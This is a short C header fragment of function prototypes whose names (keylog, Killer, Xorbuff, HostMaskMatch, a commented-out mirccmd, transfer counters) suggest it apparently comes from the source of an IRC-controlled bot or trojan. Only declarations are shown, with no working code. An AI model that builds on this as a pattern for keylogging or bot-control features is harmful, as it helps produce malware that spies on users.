 char * replacestr(char *str, char *oldstr, char *newstr);
 char *GetIP(SOCKET sock);
  int Split(char *inStr, void *saveArray);
 //unsigned long ResolveAddress(char *Host);
 char *Xorbuff(char *buff,int buffLen);
 // function prototypes (not really neccesary, but this way i can put the functions in any order i want)
 int set (char **wildcard, char **test);
 int asterisk (char **wildcard, char **test);
 int wildcardfit (char *wildcard, char *test);
 int HostMaskMatch(char *h);
 //void mirccmd(char *cmd);
unsigned long ResolveAddress(char *szHost);
int Killer();
void *keylog ();

extern int transfers;
extern bool transfer_info;